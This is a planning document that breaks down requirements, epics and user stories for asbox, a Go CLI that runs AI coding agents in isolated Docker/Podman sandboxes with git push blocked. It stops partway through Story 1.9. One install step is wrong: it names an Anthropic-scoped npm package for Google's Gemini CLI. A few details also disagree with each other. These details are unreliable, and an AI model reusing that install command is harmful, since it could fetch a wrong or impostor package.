---
stepsCompleted:
  - step-01-validate-prerequisites
  - step-02-design-epics
  - step-03-create-stories
  - step-04-final-validation
inputDocuments:
  - planning-artifacts/prd.md
  - planning-artifacts/architecture.md
  - planning-artifacts/sprint-change-proposal-2026-04-06.md
---

# asbox - Epic Breakdown

## Overview

This document provides the complete epic and story breakdown for asbox, decomposing the requirements from the PRD and Architecture into implementable stories. asbox is a Go CLI binary that wraps Docker to provide AI coding agents with isolated development environments.

## Requirements Inventory

### Functional Requirements

FR1: Developer can define SDK versions (Node.js, Go, Python) in a YAML configuration file
FR2: Developer can specify additional system packages to install in the sandbox image
FR3: Developer can configure which MCP servers to pre-install (e.g., Playwright)
FR4: Developer can declare host directories to mount into the sandbox with source and target paths
FR5: Developer can declare secret names that will be resolved from host environment variables at runtime
FR6: Developer can set non-secret environment variables for the agent runtime
FR7: Developer can select which AI agent runtime to use (claude, gemini, codex)
FR8: Developer can override the default config file path with a `-f` flag
FR9: Developer can generate a starter configuration file with sensible defaults via `asbox init`
FR9a: Developer can enable automatic dependency isolation (`auto_isolate_deps: true`) to create named Docker volume mounts over platform-specific dependency directories
FR9b: When `auto_isolate_deps` is enabled, the system scans mounted project paths at launch for `package.json` files and creates named Docker volumes for each corresponding `node_modules/` directory
FR9c: The system logs all auto-detected dependency isolation mounts at launch
FR9d: Developer can configure a host agent configuration directory mount (`host_agent_config`) with source and target paths for OAuth token synchronization
FR9e: Developer can optionally set `project_name` in configuration to override the default project identifier
FR10: Developer can build a sandbox container image from configuration via `asbox build`
FR11: Developer can launch a sandbox session in TTY mode via `asbox run`
FR12: System automatically builds the image if not present when `asbox run` is invoked
FR13: System detects when configuration or template files have changed and triggers a rebuild
FR14: Developer can stop a running sandbox session with Ctrl+C
FR15: System validates that Docker is present before proceeding
FR16: System validates that all declared secrets are set in the host environment before launching
FR16a: When `auto_isolate_deps` is enabled, the system creates named Docker volume mounts for each detected dependency directory during sandbox launch and ensures correct ownership
FR17: AI agent can execute inside the sandbox with full terminal access
FR18: Claude Code agent launches with permissions skipped (sandbox provides isolation)
FR19: Gemini CLI agent launches with standard configuration
FR19a: Codex CLI agent launches with approvals and sandbox bypassed (`codex --dangerously-bypass-approvals-and-sandbox`)
FR20: Agent can interact with project files mounted from the host
FR21: Agent can execute BMAD method workflows
FR22: Agent can install additional packages and dependencies at runtime via package managers
FR23: Agent can use git for local operations (add, commit, log, diff, branch, checkout, merge, amend)
FR24: Agent can access the internet for fetching documentation, packages, and dependencies
FR25: Agent can use common CLI tools (curl, wget, dig, etc.)
FR26: Agent can build Docker images from Dockerfiles inside the sandbox
FR27: Agent can run `docker compose up` to start multi-service applications inside the sandbox
FR28: Agent can reach application ports of services running in inner containers
FR29: Agent can run Playwright tests against running applications via MCP integration
FR29a: Agent can run Playwright tests using chromium for desktop and webkit for mobile device emulation
FR30: Agent can start MCP servers as needed via MCP protocol
FR31: System blocks git push operations, returning standard authentication failure errors
FR32: System prevents agent access to host filesystem beyond explicitly mounted paths
FR33: System prevents agent access to host credentials, SSH keys, and cloud tokens not explicitly declared as secrets
FR34: System prevents inner containers from being reachable outside the sandbox network
FR35: System enforces non-privileged inner Docker (no `--privileged` mode, no host Docker socket mount)
FR36: System provides a private network bridge for communication between inner containers only
FR37: System returns standard CLI error codes when agent attempts operations outside the boundary
FR38: System generates a Dockerfile from an embedded Go template using configuration values
FR39: System pins base images to digest for reproducible builds
FR40: System passes SDK versions as build arguments to the Dockerfile
FR41: System installs configured MCP servers at image build time
FR42: System enforces git push blocking and isolation boundaries from within the sandbox image
FR43: System tags images using content hash (pattern: `asbox-<project>:<hash>`) for cache management
FR44: System installs agent environment instruction files (CLAUDE.md, GEMINI.md, CODEX.md) into the sandbox user's home directory at image build time
FR45: When `host_agent_config` is configured, system mounts the host agent configuration directory read-write and sets the config directory environment variable (e.g., CLAUDE_CONFIG_DIR)
FR46: System merges build-time MCP server manifest with project-level `.mcp.json` at runtime; project config takes precedence on name conflicts
FR47: System exits with specific exit codes to distinguish error categories: 0 (success), 1 (configuration error), 2 (usage error), 3 (missing dependency), 4 (secret validation failure). Implemented via Go structured error types.
FR48: System uses Tini as init process (PID 1) for proper signal forwarding and zombie process reaping
FR49: System aligns sandbox user UID/GID with host user at container startup to ensure correct file permissions on mounted directories
FR50: All supporting files (Dockerfile template, entrypoint.sh, git-wrapper.sh, healthcheck-poller.sh, agent-instructions.md, starter config template) are embedded in the Go binary via the `embed` package
FR51: Developer can configure `bmad_repos` as a list of local paths to checked-out repositories
FR52: When `bmad_repos` is configured, the system automatically creates mount mappings for each repository into `/workspace/repos/<repo_name>` inside the sandbox container
FR53: When `bmad_repos` is configured, the system generates an agent configuration file instructing the agent about git operations within repos, and mounts it into the container
FR54: The system is distributed as a single statically-linked Go binary with no external runtime dependencies beyond Docker
FR60: Developer can use `-a` as a short alias for `--agent` on `asbox run`
FR61: Developer can specify the agent as a positional argument on `asbox run`; providing both positional and `-a`/`--agent` exits with code 2
FR62: Sandbox image includes pre-installed DevOps validation tools at pinned versions (kubectl, helm, kustomize, yq, jq, opentofu, tflint, kubeconform, kube-linter, trivy, flux, sops)
FR63: Sandbox image includes pre-installed code exploration tools at pinned versions (ripgrep, fd, ast-grep, universal-ctags)
FR64: Generated bmad_repos agent instructions include explicit branch-management guidance (feature branches, stashing, cross-session resume)
FR65: Developer can pass `--fetch` to `asbox run` to run host-side `git fetch --all` across all mounted repositories before the agent launches
FR66 (exploratory): System supports experimental integration paths for a local Kubernetes cluster — research spike with three evaluation tracks (in-sandbox kind, host k3s with kubeconfig injection, TBD alternatives)

### NonFunctional Requirements

NFR1: No host credential, SSH key, or cloud token is accessible inside the sandbox unless explicitly declared in config
NFR2: Git push operations fail with standard error codes regardless of remote configuration
NFR3: Inner containers cannot bind to network interfaces reachable from outside the sandbox
NFR4: The sandbox container runs without `--privileged` flag and without host Docker socket mount
NFR5: Secrets are injected as runtime environment variables only — never written to filesystem, image layers, or build cache
NFR6: Mounted paths are limited to those explicitly declared in config
NFR7: The CLI works with Docker Engine 20.10+ on the host; inside, rootless Podman 5.x with docker CLI alias
NFR8: YAML configuration is parsed via Go's `gopkg.in/yaml.v3` — no external parsing dependency
NFR9: MCP servers follow standard MCP protocol and are startable by any MCP-compatible agent
NFR10: Git wrapper is transparent for all operations except push
NFR11: CLI runs on macOS (arm64/amd64) and Linux (amd64) as statically-linked Go binary
NFR12: Image builds are reproducible — same config + template + sandbox files produce identical image
NFR13: CLI fails fast with error messages naming the missing dependency, unset secret, or invalid field with fix action. Each error category returns a distinct exit code (1-4).
NFR14: Crashed or Ctrl+C'd sandbox leaves no orphaned containers or dangling networks
NFR15: Integration test suite covers all supported use cases with parallel Go test execution
NFR16: Pre-installed DevOps and exploration tools (FR62, FR63) use explicit pinned versions declared in a single place in `embed/Dockerfile.tmpl`. Version bumps trigger a content-hash rebuild

### Additional Requirements

- Go CLI with Cobra for command dispatch (init, build, run), `-f` flag, `--help`
- `gopkg.in/yaml.v3` for config parsing into typed Go structs with validation
- Go `text/template` for Dockerfile generation with conditional blocks (`{{if}}`, `{{range}}`) and whitespace control
- Go `embed` package for all supporting files — single `embed.go` with `//go:embed` directives
- `os/exec` for Docker/Podman CLI interaction
- Content-hash: SHA256 over rendered Dockerfile + all embedded scripts (entrypoint.sh, git-wrapper.sh, healthcheck-poller.sh) + base image digest + config content. First 12 chars for tag.
- Image tagging: `asbox-<project>:<hash>` primary tag + `asbox-<project>:latest`
- Typed errors per package (`ConfigError`, `SecretError`, `DependencyError`, `TemplateError`), exit code mapping in `cmd/` only
- Error message format: what failed + why + fix action
- Config validation before template rendering — zero-value required fields caught before rendering
- Podman 5.x from upstream Kubic/OBS repository, `vfs` storage driver, `netavark`/`aardvark-dns`, `file` events logger
- Podman API socket at `$XDG_RUNTIME_DIR/podman/podman.sock` with `DOCKER_HOST` set
- `podman-docker` package for docker CLI alias
- Testcontainers compatibility: Ryuk disabled, socket override, localhost host override
- Tini as PID 1 for signal forwarding and zombie reaping
- Entrypoint: UID/GID alignment via `usermod`/`groupmod` with UID 1000 conflict handling (delete conflicting user)
- Entrypoint: `chown` named volume mounts for unprivileged sandbox user
- Entrypoint: MCP manifest merge from `/etc/sandbox/mcp-servers.json`, project config wins on conflicts
- Entrypoint: healthcheck-poller.sh as background daemon with trap-and-restart loop
- Entrypoint: Podman API socket start, restricted to sandbox user
- Git wrapper at `/usr/local/bin/git` — intercepts push, passes all else to `/usr/bin/git`
- auto_isolate_deps: Go `filepath.WalkDir` scan, named volume pattern `asbox-<project>-<path>-node_modules`, always log scan summary
- bmad_repos: mount to `/workspace/repos/<basename>`, basename collision detection (error exit 1), agent instruction file from Go template
- host_agent_config: read-write mount with `CLAUDE_CONFIG_DIR` env var
- Ubuntu 24.04 LTS base image pinned to digest
- Playwright with chromium + webkit (webkit requires ~60 additional system packages for mobile emulation)
- Claude Code installed via official Anthropic install script
- Gemini CLI installed via npm global install
- Docker Compose v2 as standalone binary + CLI plugin symlink
- Cross-platform release via goreleaser (macOS arm64/amd64, Linux amd64)
- testcontainers-go for integration tests
- Project structure: `cmd/` (Cobra), `internal/config/`, `internal/template/`, `internal/docker/`, `internal/hash/`, `internal/mount/`, `embed/`, `integration/`

### UX Design Requirements

N/A — asbox is a CLI tool with no GUI. No UX design document applicable.

### FR Coverage Map

| FR | Epic | Description |
|---|---|---|
| FR1 | Epic 1 | SDK versions in YAML config |
| FR2 | Epic 1 | System packages in config |
| FR3 | Epic 5 | MCP server configuration |
| FR4 | Epic 2 | Host directory mounts |
| FR5 | Epic 2 | Secret declaration and injection |
| FR6 | Epic 1 | Non-secret environment variables |
| FR7 | Epic 1 | Default agent selection (overridable via --agent) |
| FR8 | Epic 1 | Config file path override (`-f`) |
| FR9 | Epic 1 | `asbox init` starter config |
| FR9a | Epic 6 | auto_isolate_deps config option |
| FR9b | Epic 6 | Scan and create volumes for node_modules |
| FR9c | Epic 6 | Log isolated mounts |
| FR9d | Epic 7 | host_agent_config boolean with auto path resolution |
| FR9e | Epic 1 | project_name config override |
| FR10 | Epic 1 | `asbox build` command |
| FR11 | Epic 1 | `asbox run` in TTY mode |
| FR12 | Epic 1 | Auto-build on run |
| FR13 | Epic 1 | Change detection and rebuild |
| FR14 | Epic 1 | Ctrl+C stop |
| FR15 | Epic 1 | Docker dependency validation |
| FR16 | Epic 2 | Secret validation before launch |
| FR16a | Epic 6 | Volume mounts assembled at launch |
| FR17 | Epic 2 | Agent terminal access |
| FR18 | Epic 2 | Claude Code with --dangerously-skip-permissions |
| FR19 | Epic 2 | Gemini CLI standard launch |
| FR19a | Epic 2 | Codex CLI with --dangerously-bypass-approvals-and-sandbox |
| FR20 | Epic 2 | Agent interacts with mounted files |
| FR21 | Epic 2 | BMAD workflow support |
| FR22 | Epic 2 | Runtime package installation |
| FR23 | Epic 2 | Local git operations |
| FR24 | Epic 2 | Internet access |
| FR25 | Epic 2 | Common CLI tools |
| FR26 | Epic 4 | Build Docker images inside sandbox |
| FR27 | Epic 4 | Docker Compose inside sandbox |
| FR28 | Epic 4 | Reach inner container ports |
| FR29 | Epic 5 | Playwright tests via MCP |
| FR29a | Epic 5 | Chromium + webkit browser support |
| FR30 | Epic 5 | Start MCP servers via protocol |
| FR31 | Epic 3 | Git push blocked |
| FR32 | Epic 3 | Filesystem restricted to mounts |
| FR33 | Epic 3 | Host credentials inaccessible |
| FR34 | Epic 4 | Inner containers not reachable externally |
| FR35 | Epic 4 | Non-privileged inner Docker |
| FR36 | Epic 4 | Private network bridge |
| FR37 | Epic 3 | Standard error codes at boundaries |
| FR38 | Epic 1 | Dockerfile from embedded Go template |
| FR39 | Epic 1 | Base images pinned to digest |
| FR40 | Epic 1 | SDK versions as build args |
| FR41 | Epic 5 | MCP servers installed at build time |
| FR42 | Epic 3 | Isolation scripts baked into image |
| FR43 | Epic 1 | Content-hash image tagging |
| FR44 | Epic 1 | Agent instruction files baked into image |
| FR45 | Epic 7 | host_agent_config auto mount + per-agent env var |
| FR46 | Epic 5 | MCP manifest merge at runtime |
| FR47 | Epic 1 | Go structured error types with exit codes |
| FR48 | Epic 1 | Tini as PID 1 |
| FR49 | Epic 1 | UID/GID alignment at startup |
| FR50 | Epic 1 | Embedded assets via Go embed |
| FR51 | Epic 8 | bmad_repos config option |
| FR52 | Epic 8 | Auto-mount repos to /workspace/repos/<name> |
| FR53 | Epic 8 | Generated agent instruction file for repos |
| FR54 | Epic 1 | Single statically-linked Go binary |
| FR55 | Epic 1 | --no-cache flag for build command |
| FR56 | Epic 1 | installed_agents list for multi-agent image builds |
| FR57 | Epic 1 | --agent CLI flag to override default agent at runtime |
| FR58 | Epic 1 | Short agent names (claude, gemini, codex) |
| FR59 | Epic 1 | Agent config registry for automatic host_agent_config paths |
| NFR5 | Epic 11 | Config input sanitization (SDK, packages, ENV, project_name) |
| NFR11 | Epic 11 | Non-TTY runtime support for CI/CD |
| NFR12 | Epic 11 | Pinned build dependencies for reproducibility |
| NFR14 | Epic 11 | Concurrent sandbox session support |
| FR60 | Epic 12 | `-a` short flag for agent override |
| FR61 | Epic 12 | Positional agent argument with mutual exclusion |
| FR64 | Epic 13 | Branch-management guidance in bmad_repos agent instructions |
| FR65 | Epic 13 | `--fetch` flag for host-side upstream sync |
| FR62 | Epic 14 | Pre-installed DevOps validation toolchain |
| FR63 | Epic 14 | Pre-installed code exploration tools |
| NFR16 | Epic 14 | Pinned versions for pre-installed toolchain |
| FR66 | Epic 15 (POC) | Local Kubernetes cluster integration research spike |

## Epic List

### Epic 1: Developer Can Build and Launch a Sandbox
A developer can install the `asbox` binary, create a configuration file, build a container image, and launch an interactive sandbox session with a working agent inside. Multiple agents can be installed in a single image and switched at runtime.
**FRs covered:** FR1, FR2, FR6, FR7, FR8, FR9, FR9e, FR10, FR11, FR12, FR13, FR14, FR15, FR38, FR39, FR40, FR43, FR44, FR47, FR48, FR49, FR50, FR54, FR56, FR57, FR58, FR59

### Epic 2: Agent Can Work With Project Files and Git
An agent inside the sandbox can access mounted project files, use local git, install packages, and work with CLI tools and internet — a complete development workflow minus Docker and MCP.
**FRs covered:** FR4, FR5, FR16, FR17, FR18, FR19, FR19a, FR20, FR21, FR22, FR23, FR24, FR25

### Epic 3: Sandbox Enforces Isolation Boundaries
The sandbox enforces hard boundaries: git push is blocked, host filesystem is restricted, host credentials are inaccessible, and boundary violations return standard CLI error codes.
**FRs covered:** FR31, FR32, FR33, FR37, FR42

### Epic 4: Agent Can Build and Run Docker Services
An agent can build Docker images, run multi-service applications with Docker Compose, and reach application ports — all inside the sandbox using Podman as a transparent Docker replacement.
**FRs covered:** FR26, FR27, FR28, FR34, FR35, FR36

### Epic 5: Agent Can Run Browser Tests via MCP
An agent can use MCP servers (Playwright with chromium + webkit) to run E2E browser tests including mobile device emulation against running applications inside the sandbox.
**FRs covered:** FR3, FR29, FR29a, FR30, FR41, FR46

### Epic 6: Developer Can Isolate Platform Dependencies Automatically
The sandbox automatically detects and isolates `node_modules/` directories using named Docker volumes, preventing macOS-compiled native modules from crashing inside the Linux sandbox.
**FRs covered:** FR9a, FR9b, FR9c, FR16a

### Epic 7: Developer Can Share Host Agent Authentication
Host agent config directory is automatically mounted based on the selected agent, so the sandbox agent picks up existing OAuth tokens without re-authentication each session. Enabled by default, paths resolved automatically from the agent config registry.
**FRs covered:** FR9d, FR45

### Epic 8: Developer Can Run Multi-Repo BMAD Workflows
A developer can configure multiple repositories that get auto-mounted into the sandbox with generated agent instructions, enabling multi-repo development workflows.
**FRs covered:** FR51, FR52, FR53

### Epic 9: Integration Test Suite Validates All Use Cases
Comprehensive integration tests verify sandbox lifecycle, mounts, secrets, isolation, inner containers, MCP, auto_isolate_deps, and bmad_repos with parallel Go test execution.
**FRs covered:** NFR15

### Epic 10: Remove Legacy Bash Implementation
Remove all files from the original bash sandbox implementation that have been fully replaced by the Go rewrite. Update documentation to reflect the Go project structure.
**FRs covered:** N/A (cleanup)

### Epic 11: Hardening for Production Readiness
A developer can run concurrent sandbox sessions, use asbox in CI/CD pipelines, and trust that all configuration inputs are validated against injection risks, with reproducible image builds via pinned dependencies and safe agent command execution.
**FRs covered:** NFR5, NFR11, NFR12, NFR14

**Stories:**
- 11-1: Concurrent Sandbox Sessions — random suffix, conflict detection, backward compat, cleanup verification
- 11-2: SDK, Package, and Project Name Sanitization — semver validation, apt-safe charset, explicit project_name
- 11-3: ENV Key/Value Validation — shell variable name format, newline injection blocking
- 11-4: Non-TTY Runtime Support — TTY detection, conditional -it vs -i
- 11-5: Pinned Build Dependencies — Docker Compose, npm agents, multi-arch base image digest, update workflow
- 11-6: Agent Command Injection Hardening — replace bash -c with exec array pattern

### Epic 12: CLI Ergonomics for Agent Override
Reduce friction on the most common runtime choice (which agent to launch) by adding a short flag alias and a positional argument to `asbox run`. Enforce mutual exclusion between the two forms so resolution is never ambiguous.
**FRs covered:** FR60, FR61

### Epic 13: Multi-Repo State Management
A developer working across multiple repositories via `bmad_repos` gets two improvements: the generated agent instructions include opinionated branch-management conventions so the agent doesn't have to improvise, and `asbox run --fetch` syncs every mounted repository with its remote before the sandbox starts — solving the "sandbox can't reach host git credentials" problem by performing fetch on the host side.
**FRs covered:** FR64, FR65

### Epic 14: Pre-Installed Validation & Exploration Toolchain
The sandbox image ships with a pinned DevOps validation toolchain (kubectl, helm, kustomize, yq, jq, opentofu, tflint, kubeconform, kube-linter, trivy, flux, sops) and a pinned code exploration toolchain (ripgrep, fd, ast-grep, universal-ctags). Agents can validate Kubernetes/Terraform work and navigate repos efficiently without spending turns on package installation or tool discovery.
**FRs covered:** FR62, FR63, NFR16

### Epic 15 (Research/POC): Local Kubernetes Cluster Integration
Research spike evaluating whether and how to expose a disposable local Kubernetes cluster to the sandboxed agent. Three evaluation tracks are on the table: (a) `kind` inside the sandbox via inner Podman, (b) host-side `k3s`/`kind` with kubeconfig injection, (c) alternatives surfaced by the spike. Output is a recommendation, prototype, and security analysis. Productionization is gated on the spike outcome and not committed here.
**FRs covered:** FR66 (exploratory)

## Epic 1: Developer Can Build and Launch a Sandbox

A developer can install the `asbox` binary, create a configuration file, build a container image, and launch an interactive sandbox session with a working agent inside.

### Story 1.1: Go Project Scaffold and CLI Skeleton

As a developer,
I want to run `asbox` and see usage help, and have the CLI validate that Docker is installed,
So that I know the tool is working and will fail clearly if prerequisites are missing.

**Acceptance Criteria:**

**Given** a developer has the `asbox` binary on their PATH
**When** they run `asbox --help`
**Then** usage information is displayed showing available commands (init, build, run) and flags (-f, --help, --version)

**Given** Docker is not installed on the host
**When** the developer runs any asbox command
**Then** the CLI exits with code 3 and prints `"error: docker not found. Install Docker Engine 20.10+ or Docker Desktop"` to stderr

**Given** the developer runs `asbox build` or `asbox run` before these commands are implemented
**When** the stub command executes
**Then** the CLI exits with code 1 and prints `"error: not implemented"` to stderr

**Given** any error occurs during execution
**When** the CLI exits
**Then** it returns the appropriate exit code: 1 (config/general), 2 (usage), 3 (dependency), 4 (secret) — mapped from typed error types in `cmd/root.go`

**Given** the asbox binary is built with `CGO_ENABLED=0`
**When** inspecting the binary
**Then** it is statically linked with no external runtime dependencies

**Implementation Notes:**
- `main.go` — single line: `cmd.Execute()`
- `cmd/root.go` — Cobra root command, `-f` persistent flag, `--version`, error-type-to-exit-code switch
- `cmd/init.go`, `cmd/build.go`, `cmd/run.go` — stub commands returning `ConfigError{Msg: "not implemented"}`
- `embed/embed.go` — `//go:embed` directives for all assets (files can be placeholder content initially)
- `go.mod` with module definition, Cobra dependency
- Docker check via `exec.LookPath("docker")`

### Story 1.2: Configuration Parsing and Validation

As a developer,
I want asbox to parse my `.asbox/config.yaml` and validate all settings,
So that invalid configuration is caught early with clear error messages.

**Acceptance Criteria:**

**Given** a valid config.yaml with SDKs, packages, env vars, agent, and project_name
**When** asbox parses the config via `config.Parse()`
**Then** all values are extracted into typed Go structs and available for downstream use

**Given** no config file exists at the default path (`.asbox/config.yaml`) or the path specified by `-f`
**When** asbox attempts to parse the config
**Then** the CLI exits with code 1 and prints `"error: config file not found at <path>. Run 'asbox init' to create one"`

**Given** a config.yaml with a required field set to empty string (e.g., `agent: ""`)
**When** asbox validates the config
**Then** the CLI exits with code 1 and prints an error naming the empty required field and stating the fix action

**Given** the developer passes `-f path/to/config.yaml`
**When** asbox parses the config
**Then** it reads from the specified path instead of `.asbox/config.yaml`

**Given** mount paths in config use relative paths (e.g., `source: "."`)
**When** asbox resolves mount paths
**Then** paths are resolved relative to the config file location, not the working directory

**Given** `project_name` is not set in config
**When** asbox derives the project name
**Then** it defaults to the parent directory name of the `.asbox/` folder, sanitized to lowercase alphanumeric with hyphens

**Implementation Notes:**
- `internal/config/config.go` — `Config` struct with YAML tags, `SDKConfig`, `MountConfig` sub-structs
- `internal/config/parse.go` — `Parse(configPath string) (*Config, error)` with validation and path resolution
- `internal/config/parse_test.go` — table-driven tests for all validation cases
- Typed errors: `ConfigError{Field, Msg}` returned from Parse

### Story 1.3: Base Dockerfile Template

As a developer,
I want a base Dockerfile template that sets up Ubuntu, Tini, non-root user, and common packages,
So that the sandbox has a solid foundation before SDK-specific customization.

**Acceptance Criteria:**

**Given** the embedded Dockerfile template
**When** rendered with any valid config
**Then** the output starts with `FROM ubuntu:24.04@sha256:<pinned-digest>` (FR39)

**Given** the template renders the base section
**When** inspecting the output
**Then** it installs Tini as PID 1, creates a non-root sandbox user, and installs common packages (curl, wget, dig, git, jq, etc.)

**Given** the template renders the entrypoint section
**When** inspecting the output
**Then** tini is configured as the ENTRYPOINT with entrypoint.sh as the argument

**Given** non-secret environment variables are defined in config
**When** the template renders
**Then** they are set via `ENV` directives in the Dockerfile

**Implementation Notes:**
- `embed/Dockerfile.tmpl` — Go `text/template` with `{{if}}`, `{{range}}`, `{{end}}`, whitespace control via `{{-`/`-}}`
- `internal/template/render.go` — `Render(cfg *config.Config) (string, error)`
- `internal/template/render_test.go` — tests for base rendering, no-SDK config
- This story creates the template structure; Stories 1.4 and 1.5 add SDK blocks and tooling

### Story 1.4: SDK Installation Blocks in Dockerfile Template

As a developer,
I want conditional SDK installation blocks in the Dockerfile template,
So that my sandbox image includes only the SDKs I specified in my config.

**Acceptance Criteria:**

**Given** a config with `sdks: {nodejs: "22"}`
**When** the template renders
**Then** the Node.js 22 installation block is included and the Go/Python blocks are excluded

**Given** a config with `sdks: {nodejs: "22", python: "3.12"}`
**When** the template renders
**Then** both Node.js 22 and Python 3.12 blocks are included

**Given** a config with no SDKs specified
**When** the template renders
**Then** all SDK conditional blocks are excluded with no blank lines remaining

**Given** a config with `packages: [build-essential, libpq-dev]`
**When** the template renders
**Then** the additional packages are installed via `apt-get install` using `{{range .Packages}}`

**Given** SDK versions are passed as build arguments
**When** the Dockerfile is built
**Then** each SDK version is available as a `--build-arg` (FR40)

**Implementation Notes:**
- Extends `embed/Dockerfile.tmpl` from Story 1.3
- Conditional blocks: `{{if .SDKs.NodeJS}}...{{end}}`, `{{if .SDKs.Go}}...{{end}}`, `{{if .SDKs.Python}}...{{end}}`
- `internal/docker/build.go` — `--build-arg` flag assembly from config SDKs
- Multi-arch: Binary downloads (e.g., Go SDK tarball) must use `$(dpkg --print-architecture)` to resolve correct arch at build time — never hardcode `amd64`/`arm64`

### Story 1.5: Container Scripts and Tooling in Dockerfile Template

As a developer,
I want all container-side scripts, Podman, Docker Compose, and agent CLIs installed in the image,
So that the sandbox has everything needed for agent operation.

**Acceptance Criteria:**

**Given** the Dockerfile template
**When** rendered and built
**Then** `entrypoint.sh`, `git-wrapper.sh`, and `healthcheck-poller.sh` are COPY'd from embedded assets into the image

**Given** the built image
**When** inspecting Podman installation
**Then** Podman 5.x is installed from upstream Kubic/OBS repository with `podman-docker` alias, `vfs` storage driver config, `netavark` networking, `aardvark-dns`, and `file` events logger

**Given** the built image
**When** inspecting Docker Compose
**Then** Docker Compose v2 is installed as standalone binary at `/usr/local/bin/docker-compose` with symlink at `/usr/local/lib/docker/cli-plugins/docker-compose`

**Given** the config specifies `agent: claude-code`
**When** the image is built
**Then** Claude Code is installed via the official Anthropic install script

**Given** the config specifies `agent: gemini-cli`
**When** the image is built
**Then** Gemini CLI is installed via `npm install -g @anthropic-ai/gemini-cli`

**Given** the built image
**When** inspecting agent instruction files
**Then** `CLAUDE.md` and/or `GEMINI.md` are present in the sandbox user's home directory (FR44)

**Given** the git wrapper script
**When** inspecting its location and ownership
**Then** it is at `/usr/local/bin/git`, owned by root, and the sandbox user cannot modify it

**Implementation Notes:**
- Extends `embed/Dockerfile.tmpl` from Stories 1.3-1.4
- `embed/entrypoint.sh` — FULL implementation: UID/GID alignment (with UID 1000 conflict handling via `userdel`), `chown` volume mounts, MCP manifest merge from `/etc/sandbox/mcp-servers.json`, healthcheck-poller start (trap-and-restart loop, PID tracked), Podman API socket start (`podman system service`), `exec` agent command
- `embed/git-wrapper.sh` — FULL implementation: checks `$1` for `push`, returns `"fatal: Authentication failed"` exit 1, passes all else to `/usr/bin/git`
- `embed/healthcheck-poller.sh` — FULL implementation: polls every 10s, trap-and-restart loop for fault tolerance
- `embed/agent-instructions.md.tmpl` — Go template for CLAUDE.md/GEMINI.md with sandbox constraints
- Podman setup: add Kubic repo key + source, install podman + podman-docker, configure storage.conf (vfs), containers.conf (netavark, aardvark-dns, file logger)
- Testcontainers compatibility: set `TESTCONTAINERS_RYUK_DISABLED=true`, `TESTCONTAINERS_DOCKER_SOCKET_OVERRIDE`, `TESTCONTAINERS_HOST_OVERRIDE=localhost`
- Webkit note: Use `npx playwright install-deps webkit` to install system deps. Validate via `ldd` against the webkit binary post-build. If `install-deps` is insufficient, add explicit `apt-get install` for missing packages.
- Multi-arch: All binary downloads (Docker Compose, etc.) must detect host architecture at build time — use `$(dpkg --print-architecture)` or `$(uname -m)` as appropriate. Also fix pre-existing Go SDK `linux-amd64` hardcode from Story 1.4.

### Story 1.6: Image Build with Content-Hash Caching

As a developer,
I want `asbox build` to build my container image and skip rebuilds when nothing has changed,
So that I get fast iteration without unnecessary rebuilds.

**Acceptance Criteria:**

**Given** a valid config.yaml and Dockerfile template
**When** the developer runs `asbox build`
**Then** a Docker image is built and tagged as `asbox-<project>:<hash>` (12-char SHA256) and `asbox-<project>:latest`

**Given** an image already exists with the current content hash
**When** the developer runs `asbox build`
**Then** the build is skipped and a message indicates the image is up to date

**Given** the developer modifies config.yaml or any embedded script
**When** they run `asbox build`
**Then** a new content hash is computed and the image is rebuilt

**Given** the content hash inputs
**When** computing the hash
**Then** it includes: rendered Dockerfile (which contains the pinned base image digest) + entrypoint.sh + git-wrapper.sh + healthcheck-poller.sh + config.yaml content

**Given** `docker build` fails
**When** the error is returned
**Then** the CLI prints the Docker error output to stderr and exits with code 1

**Given** an image already exists with the current content hash
**When** the developer runs `asbox build --no-cache`
**Then** the hash existence check is skipped, `docker build` runs with `--no-cache`, and the image is rebuilt from scratch (FR55)

**Given** the developer runs `asbox run --no-cache`
**When** the image needs to be built or already exists
**Then** `--no-cache` is forwarded to the build step, bypassing both the hash check and Docker layer cache

**Implementation Notes:**
- `internal/hash/hash.go` — `Compute(renderedDockerfile, scripts, configContent string) string` returning 12-char hex
- `internal/docker/build.go` — `BuildImage()` via `os/exec`, `--build-arg` flags, `-t` for both tags
- Check existing image via `docker image inspect asbox-<project>:<hash>`
- Note: base image digest is embedded in the rendered Dockerfile, so it's captured by hashing the rendered output — no separate digest input needed

### Story 1.7: Sandbox Run with TTY and Lifecycle

As a developer,
I want `asbox run` to launch my sandbox in interactive TTY mode with proper signal handling,
So that I can interact with the agent and cleanly stop it with Ctrl+C.

**Acceptance Criteria:**

**Given** an image exists for the current config
**When** the developer runs `asbox run`
**Then** the container launches in TTY mode (`-it`) with tini as PID 1 and the configured agent as the foreground process

**Given** no image exists for the current config
**When** the developer runs `asbox run`
**Then** the image is automatically built first, then the container launches (FR12)

**Given** config changes have been made since the last build
**When** the developer runs `asbox run`
**Then** the image is automatically rebuilt before launching (FR13)

**Given** a running sandbox session
**When** the developer presses Ctrl+C
**Then** tini forwards SIGTERM, the agent terminates, and the container exits with no orphaned containers or dangling networks (NFR14)

**Given** the host user has UID 1001
**When** the container starts
**Then** the entrypoint aligns the sandbox user's UID/GID via HOST_UID/HOST_GID env vars

**Given** the host user has UID 1000 matching the image default user
**When** the container starts
**Then** the entrypoint skips UID modification

**Implementation Notes:**
- `cmd/run.go` — orchestrates: `config.Parse()` → build-if-needed (hash check, respects `--no-cache` flag) → mount assembly → secret validation → `docker.RunContainer()`
- `internal/docker/run.go` — `RunContainer()` via `os/exec` with `-it`, `--init`, HOST_UID/HOST_GID as `--env`, agent command as container CMD
- Passes current user UID/GID via `os.Getuid()` and `os.Getgid()`

### Story 1.8: Configuration Initialization

As a developer,
I want to run `asbox init` to generate a starter configuration file,
So that I have a working starting point for configuring my sandbox.

**Acceptance Criteria:**

**Given** no `.asbox/config.yaml` exists in the current directory
**When** the developer runs `asbox init`
**Then** `.asbox/config.yaml` is created from the embedded starter template with sensible defaults and inline comments

**Given** `.asbox/config.yaml` already exists
**When** the developer runs `asbox init`
**Then** the CLI exits with code 1 and prints `"error: config already exists at .asbox/config.yaml"` to stderr

**Given** the developer specifies `-f custom/path/config.yaml`
**When** they run `asbox init -f custom/path/config.yaml`
**Then** the config is generated at the specified path, creating parent directories if needed

**Given** the generated config
**When** inspecting the file
**Then** `auto_isolate_deps` appears as a commented-out option with explanation, and `bmad_repos` appears as a commented-out example

**Implementation Notes:**
- `cmd/init.go` — reads `config.yaml` from `embed.Assets`, writes to target path
- `embed/config.yaml` — starter template with inline comments, default agent claude, example SDK, example mount

### Story 1.9: Multi-Agent Runtime Support

As a developer,
I want to install multiple agents in a single sandbox image and switch between them at runtime,
